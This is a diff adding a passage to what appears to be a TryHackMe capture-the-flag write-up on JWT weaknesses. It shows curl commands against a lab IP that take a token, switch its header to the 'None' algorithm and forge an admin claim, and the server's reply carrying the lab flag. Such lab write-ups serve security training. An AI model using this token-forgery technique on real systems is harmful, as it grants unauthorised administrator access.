@@ -225,10 +225,26 @@ username = payload['username']
 flag = self.db_lookup(username, "flag")
 ```
 
+```
+ajdev@rootbox:~$ curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.49.170.207/api/v1.0/example3
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
+}
 
+{
+  "typ": "JWT",
+  "alg": "None"
+}
 
+into base64: ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0=
 
+then add this into the header
 
+ajdev@rootbox:~$ curl -H 'Authorization: Bearer ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIk5vbmUiCn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.au6ZnN5a4PDwXOM-KMMkTxZDUOBWcOU3zCGzOD5Gb-s' http://10.49.170.207/api/v1.0/example3?username=admin
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
+}
+```
 
 ---
 ### Weak Symmetric Secrets
